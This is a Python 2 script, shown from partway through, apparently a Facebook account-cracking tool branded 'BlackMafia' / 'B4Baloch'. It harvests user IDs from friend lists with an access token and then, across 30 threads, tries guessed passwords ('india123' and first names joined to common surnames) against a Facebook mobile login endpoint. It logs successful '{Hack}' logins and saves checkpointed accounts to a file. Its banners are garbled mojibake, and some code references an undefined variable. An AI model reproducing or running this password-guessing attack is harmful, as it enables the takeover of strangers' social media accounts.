	print "  \033[1;95mâ”¬Ð»-----Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´----\033[1;93mLogged in User Info\033[1;95m----Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´-----â”¬â•—"
	print "	   \033[1;94m Name\033[1;93m:\033[1;92m"+nama+"\033[1;97m               "
	print "	   \033[1;97m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;97m              "
	print "\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´\033[1;96mBlackMafia\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´"
	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;91mChoose an Option>>> \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m--\033[1;92m> \033[1;92m1.\x1b[1;91mClone From Friend List..."
	print "\033[1;96m--\033[1;92m> \033[1;92m2.\x1b[1;91mClone From Indian ID Link Public Frendlist..."
	print "\033[1;96m--\033[1;91m> \033[1;91m0.\033[1;94mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´\033[1;96mBlackMafia\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´"
		jalan('\033[1;93mGetting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;96m[Ñ‚Ð©Ð±] \033[1;92mEnter ID link\033[1;93m: \033[1;97m")
		print "\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´\033[1;96mB4baloch\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;92mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;93mGetting IDs\033[1;93m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;91mTotal IDs\033[1;93m: \033[1;94m"+str(len(id))
	jalan('\033[1;92mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94mâ”¬Ð»-----\x1b[1;93mÑ‚Ð©Ð±To Stop Process Press CTRL+ZÑ‚Ð©Ð±\033[1;94m----â”¬â•—"
	print "\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´\033[1;96mBlackMafia\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´"
	jalan(' \033[1;93m .......................Cloning Start plzzz Wait....................... ')
	print "\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´\033[1;96mBlackMafia\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:b4_baloch
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('india123')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mÑ‚Ð¨Ð®{Hack}\x1b[1;97m-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + user + '-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91mÑ‚Ð¨Ð®{CP}\x1b[1;97m-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + user + '-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = (j['first_name']+'gupta')
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mÑ‚Ð¨Ð®{Hack}\x1b[1;97m-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + user + '-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91mÑ‚Ð¨Ð®{CP}\x1b[1;97m-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + user + '-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = (j['first_name']+'ansari')
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mÑ‚Ð¨Ð®{Hack}\x1b[1;97m-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + user + '-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91mÑ‚Ð¨Ð®{CP}\x1b[1;97m-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + user + '-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = (j['first_name']+'khan')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mÑ‚Ð¨Ð®{Hack}\x1b[1;97m-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + user + '-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91mÑ‚Ð¨Ð®{CP}\x1b[1;97m-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + user + '-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = (j['first_name']+'singh')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mÑ‚Ð¨Ð®{Hack}\x1b[1;97m-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + user + '-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91mÑ‚Ð¨Ð®{CP}\x1b[1;97m-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + user + '-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = (j['first_name']+'thakur')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mÑ‚Ð¨Ð®{Hack}\x1b[1;97m-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + user + '-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mÑ‚Ð¨Ð®{CP}\x1b[1;97m-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + user + '-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = (j['first_name']+'sharma')
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mÑ‚Ð¨Ð®{Hack}\x1b[1;97m-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + user + '-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91mÑ‚Ð¨Ð®{CP}\x1b[1;97m-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + user + '-\x1b[1;94mÑ‚Ð§ÐŸ\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´\033[1;96mB4Baloch\033[1;95mÑ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´"
	print "  \033[1;91mâ”¬Ð»---Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²---Developed By baloch-hacker--Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²---â”¬â•—" #Dev:baloch_hacker
	print '\033[1;91mProcess Has Been Completed\033[1;92m....'
	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print """
             Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢
             Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢
             Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢
             Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢
             Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð˜Ñ‚Ð¦Ð¢Ñ‚Ð¦Ð¢
Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´.
: \033[1;93m.balochhacker  B4Baloch.... \033[1;93m :
Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚ÐÐ²Ñ‚Ð§Ð˜Ñ‚ÐÐ²Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´Ñ‚Ð§ÐµÑ‚Ð§Ð´.' 
                whatsapp Num
               +923156673626"""
	
	raw_input("\n\033[1;93m[\033[1;91mBack\033[1;93m]")
	menu()

if __name__ == '__main__':
	login()
